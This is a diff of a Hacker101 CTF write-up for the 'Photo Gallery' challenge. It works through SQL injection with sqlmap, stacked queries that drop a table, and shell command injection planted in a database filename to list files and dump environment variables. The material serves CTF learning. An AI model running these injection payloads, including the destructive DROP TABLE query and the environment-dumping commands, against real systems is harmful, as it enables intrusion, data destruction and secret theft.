@@ -55,13 +55,17 @@ Changing the method from GET to POST returns `405` (method not allowed), which d
 
 Lets take a look at the hints for this flag:
 
+```markdown
 * Consider how you might build this system yourself. What would the query for fetch look like?
+```
 
 Ok... I would build it so that it didn't respond with `500` for not finding an image, or for anything for that matter. Nevertheless, the wording, especially the use of the word "query", is an interesting choice.
 
 By *accidentally* clicking the hint button again, we take a quick glimpse of the second hint for this flag:
 
+```markdown
 * Take a few minutes to consider the state of the union
+```
 
 Does it mean an SQL union?
 
@@ -107,10 +111,10 @@ OS CPE: cpe:/o:linux:linux_kernel:4.2
 [...]
 ```
 
-Ok, only one open port, so there is no other point of entry. It is a linux machine, not sure how we can use this for leverage. The only thing that stands out to me (because it is the first time I see such a thing) is the `OpenResty web app server 1.19.9.1`. That is the same as the response header `server: openresty/1.19.9.1`. Let's find out what that is about.
+Ok, only one open port, so there is no other point of entry. It is a linux machine, not sure how we can use this for leverage. The only thing that stands out to me (because it is the first time I see such a thing) is the `OpenResty web app server 1.19.9.1`. That was also mentioned in the response header `server: openresty/1.19.9.1`. Let's find out what that is about.
 
 
-Quoting the website:
+Quoting the [website](https://openresty.org/en/):
 
 ```
 OpenResty® is a full-fledged web platform that integrates our enhanced version of the Nginx core, our enhanced version of LuaJIT, many carefully written Lua libraries, lots of high quality 3rd-party Nginx modules, and most of their external dependencies. It is designed to help developers easily build scalable web applications, web services, and dynamic web gateways.
@@ -123,7 +127,7 @@ The website won't shut up about them using nginx... Is this information useful? 
 
 *A few seconds later*
 
-Oh... My... God... It has a LOT of severe vulnerabilities! Courtesy of [snyk.io](https://snyk.io/test/docker/openresty%2Fopenresty%3A1.19.9.1-centos7):
+Oh... My... God... It has a LOT of severe vulnerabilities! Courtesy of [snyk.io](https://snyk.io/test/docker/openresty%2Fopenresty>1.19.9.1-centos7):
 
 ![snyk.io](./helpfull_files/vulnerabilities.png)
 
@@ -234,7 +238,7 @@ https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=-1 UNION SEL
 ```
 Finally, we get the [source code](./helpfull_files/main.py)...
 
-```html
+```python
 from flask import Flask, abort, redirect, request, Response
 import base64, json, MySQLdb, os, re, subprocess
 
@@ -277,7 +281,7 @@ if __name__ == "__main__":
 
 I am not in the mood to stumble around in the dark anymore. Give me the hints:
 
-```
+```markdown
 * I never trust a kitten I can't see
 * Or a query whose results I can't see, for that matter
 ```
@@ -302,7 +306,7 @@ Some conclusions can be drawn from looking at the code about:
 
 The `/fetch` endpoint is the one we will focus on. We can pass any SQL command to it (as long as it affects no rows, so only reading) and it has two possible responses (`404` and `500`).
 
-Let's try to use a readily available tool for this challenge. [SQLmap](https://sqlmap.org/) is the one for the job. Let's use the most common command:
+I will use a readily available tool for this challenge. [SQLmap](https://sqlmap.org/) is the one for the job. Let's use the most common command:
 
 ```
 sqlmap -u "https://38d4012ab81ae8bcc9917b2fd36e7dca.ctf.hacker101.com/fetch?id=1" --batch
@@ -333,9 +337,11 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 
 The complete log is in the [sqlmap.log](./helpfull_files/sqlmap.log) file.
 
+### Attempt 1:
+
 It has given us a lot of useful information! Let's use this tool in a more aggressive way by using the `-dbs` flag. Also, let's add some speed with `--threads 8`.
 
-sqlmap will use the exploits it have found to retrieve the databases' names. It achieves this by treating the server as an oracle. The server responds with `500` or `404` depending on whether the sql commands were run successfully or not. This way we can find a lot of info.
+sqlmap will use the exploits it has found to retrieve the databases' names. It achieves this by treating the server as an oracle. The server responds with `500` or `404` depending on whether the sql commands were run successfully or not. This way we can find a lot of info.
 
 For example, let's find what databases exist by running: 
 
@@ -470,11 +476,134 @@ The final value for the `filename` is strange. It must be some encoded string or
 Ok, that was a strange series of events... I initially thought this was a base64 string, which is not the case. Then I noticed that the letters only go up to `f` and the string has an even number of characters. This means that this might be a series of HEX values. Is it an ascii string? Wait a minute! The flag is a series of hex values. "Is the flag looking right at me?" is what I thought. This is indeed the case. That is the flag.
 
 ### Notes:
-* A very nicely written writeup for this challenge is [this one](https://dev.to/caffiendkitten/hacker101-ctf-photo-gallery-4foi) from *DaNel C*. I got the motivation to use `sqlmap` instead of writing my own tool from scratch. I don't know how she decoded the flag though. It might be an old version of the challenge? The write up was initially written on `Apr 25, 2020` and updated on `Dec 19, 2020`. I don't know...
+* A very nicely written and honest writeup for this challenge is [this one](https://dev.to/caffiendkitten/hacker101-ctf-photo-gallery-4foi) from *DaNeil C*. I got the motivation to use `sqlmap` instead of writing my own tool from scratch. I don't know how the author decoded the flag though. It might be an old version of the challenge? The write up was initially written on `Apr 25, 2020` and updated on `Dec 19, 2020`. The author maybe wrote that to divert the reader from the fact that the hex string was in fact the flag.
 * Another write up is the [one](https://www.secjuice.com/photo-gallery/) from *pirateducky*. He solves the second flag by writing his own ruby script.
 * The actual flag has been replaced by random HEX values.
 
 ---
 
-## Flag 2 -
+## Flag 2 - Having a kitten on the inside
 
+Let's see the hints first.
+
+```markdown
+* That method of finding the size of an album seems suspicious
+* Stacked queries rarely work. But when they do, make absolutely sure that you're committed
+* Be aware of your environment
+```
+
+Helpful hints this time! Let's focus on injecting multiple sql commands that affect something. `[...] make absolutely sure that you're committed` hints to running the `COMMIT` command at the end of the queries.
+
+
+Let's first do something destructive and send this payload:
+
+```
+https://dc47c371187a7d8a147fe545a8750096.ctf.hacker101.com/fetch?id=-1; DROP TABLE albums; COMMIT;
+```
+
+Which should delete the table 'albums'. The server responds with `500`, which is good. Let's go to the landing page... There is no landing page, just `500`. Success.
+
+Wait a moment. Does it need to be an invalid id? Let's try this:
+
+```
+https://dc47c371187a7d8a147fe545a8750096.ctf.hacker101.com/fetch?id=-1; DROP TABLE albums; COMMIT;
+```
+
+`404` But the main page is no longer available. Ok, so the command is executed (if it is valid) no matter the id or the response from the server. So it's a free for all.
+
+*Small note:* We can only `DROP` the `albumns` table out of the two. The `photos` table has a foreign key constraint, which is probably the `parent` column, that prevents us from deleting or emptying it. This caused me a lot of confusion until I figured it was happening.
+
+Ok. We see that we have full control of the database. Can we go further though? Can we take full control of the system?
+
+I am thinking of a way to gain more info about the server. Let's take another look at the [source code](./helpfull_files/main.py):
+
+`index()`:
+```python
+[...]
+		
+        rep += '<i>Space used: ' + subprocess.check_output(
+            'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns),# <--- Target
+            shell=True,
+            stderr=subprocess.STDOUT
+        ).strip().rsplit('\n', 1)[-1] + '</i>'
+
+		rep += '</div>\n'
+
+	return home.replace('$ALBUMS$', rep)
+
+[...]
+```
+
+`fetch()` :
+```python
+[...]
+
+@app.route('/fetch')
+def fetch():
+	cur = getDb().cursor()
+	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:# <--- Point of entry
+		abort(404)
+
+	# It's dangerous to go alone, take this:
+	# ^FLAG^****************************************************************$FLAG$
+
+	return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
+
+[...]
+```
+
+Looking at the source code I see our point of entry is through the `/fetch` endpoint by passing an `id` (eg -1) along with some SQL commands. The target is the `subprocess.check_output()` at the main page that calls `du -ch %s || exit 0` whose output gets split at the last `\n` character into a two element array, whose last element is then put into the `<i></i>` HTML tags of the main page. Taking the place of `%s` are the filenames of the files that the `photos` table contains.
+
+Let's start from the end and work our way to the beginning. Can we make it so that the server shows all the files on it? For example by running the `ls -a` command (we know from before that it is a linux machine).
+
+To escape the `du -ch %s || exit 0` it has to be something like this: `; result=( $(ls -a) ); declare -p result`. This command puts the results of a bash command (eg `ls -a`) into an array and then prints this array. Which should look something like this when parsed into the command with the already existing filenames: `du -ch files/adorable.jpg files/purrfect.jpg d107946d4c338bd606e3074815ed6545f31b2b97b46b7cb44e20f37580512c0b; result=( $(ls -a) ); declare -p result || exit 0`.
+
+Ok so we have the payload. How do we get it to execute? By adding it to the database of course!
+
+For this command, or any command for that matter, to execute it has to exist in the `filename` column of the `photos` table. We can add it there by running a couple of SQL commands from the `/fetch?` endpoint.
+
+We could add a new entry to the `photos` table, but looking at the source code we see a `LIMIT 3` at the query that fetches the photos in the `index()` function. We could probably bypass this but is is not worth the hassle. Let's just update an already existing entry with the `UPDATE` command. The last entry of the table (with `id` = 3) is the perfect choice. That value of the filename is put at the end of the `du -cd`, right before `|| exit 0`, which makes it a perfect candidate.
+
+So we send this: `/fetch?id=1; UPDATE photos SET filename = '; result=( $(ls -a) ); declare -p result' WHERE id = 3; COMMIT;`
+
+Ok, now it should be in the database (we can check the result of this and every future query easily with sqlmap). Let's go to the main page to see what happens.
+
+`500`... Ok, This is not what we wanted... The server throws an error, which of course we can't see... Maybe there are errors with the `du -ch` command? Let's make a small modification: `>& /dev/null || result=( $(ls -a) ); declare -p result`. I put an `&` to output all the results (including the errors) to `/dev/null`.
+
+After some research I found out that MySQL does not easily escape the `&`. So I can't silence the errors that get raised by this or any other command.
+
+Anyway... I sometimes overcomplicate the solution. Let's just put `; ls -a` as the command and check the main page.
+
+`Space used: uwsgi.ini`
+
+Ok! Great! Let's see it using `UNION`: `/fetch?id=-1 UNION SELECT 'uwsgi.ini'`. Ok, it doesn't contain much...
+
+Let's focus on the `/files` folder and output the results of the `ls -a` into a file with `; ls ./files >temp.txt`. We only see the two pictures...
+
+Ok, let's just check the environment variables with the command `;echo $(printenv)` like *pirateducky* did. Sure enough on the main page we see:
+
+
+```
+Space used: PYTHONIOENCODING=UTF-8 UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi SUPERVISOR_GROUP_NAME=uwsgi FLAGS=["^FLAG^****************************************************************$FLAG$","^FLAG^****************************************************************$FLAG$","^FLAG^****************************************************************$FLAG$"] HOSTNAME=ip-10-15-43-229.us-west-2.compute.internal SHLVL=0 PYTHON_PIP_VERSION=18.0 HOME=/root GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF UWSGI_INI=/app/uwsgi.ini AWS_EXECUTION_ENV=AWS_ECS_FARGATE NGINX_MAX_UPLOAD=0 UWSGI_PROCESSES=16 STATIC_URL=/static AWS_DEFAULT_REGION=us-west-2 ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/2ec7247606784d52a3904f2800dcd5e2-2858145981 UWSGI_CHEAPER=2 ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/2ec7247606784d52a3904f2800dcd5e2-2858145981 NGINX_VERSION=1.13.12-1~stretch PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin NJS_VERSION=1.13.12.0.2.0-1~stretch LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VERSION=2.7.15 AWS_REGION=us-west-2 NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app STATIC_PATH=/app/static PYTHONPATH=/app UWSGI_RELOADS=0
+```
+Which is something we should have done from the beginning it seams... No matter. This challenge is finished and we also learned that the flags are environment variables in these challenges.
+
+
+### Notes:
+* The writeup by *DaNeil C* is strange... Especially this part:
+```markdown
+1. I did try to use the previous UNION statement to view the tmp file but nothing shows up yet. Time to Google again. This I also something that I needed help with. I found the following set of code to be useful...
+2. use http://(domain)/(yourID)/fetch?id=1; update photos set filename='* || ls ./files >temp.txt ' where id=3; commit; --
+refresh the home page
+3. now use http://(domain)/(yourID)/fetch?id=1; update photos set filename='* || env >temp.txt' where id=3; commit; --
+4. refresh home
+5. use the UNION statement with 'temp.txt` and poof. allllll the flags are found. 
+```
+
+## Final thoughts:
+
+It is fun to read through the write up for the previous flags now that we know how the challenge works! Oh, I was so naive a few lines back! Some highlights:
+* I tried to stack SQL commands really [early on](###-Accessing-the-situation---part-3:)! It might have created the files, but maybe not...
+* I am wrong here: `If the query affects no rows then it uses the result of the first line to read a file and render its contents. Otherwise it 404s.`. The query gets executed anyway unless it encounters an error.
+* `I will use a readily available tool for this challenge` Thank god I didn't write my own tool from scratch! Sqlmap does a better job and it turned out to be OP for this challenge anyway, as the server's `404` or `500` responses make no difference to the query's execution. Or I might be wrong here too and I look like an idiot now!
+* To see the environment variables is an interesting thought. The flags were all there since the beginning. I don't think there is another way to get the last flag. All the writeups about this use the same way.
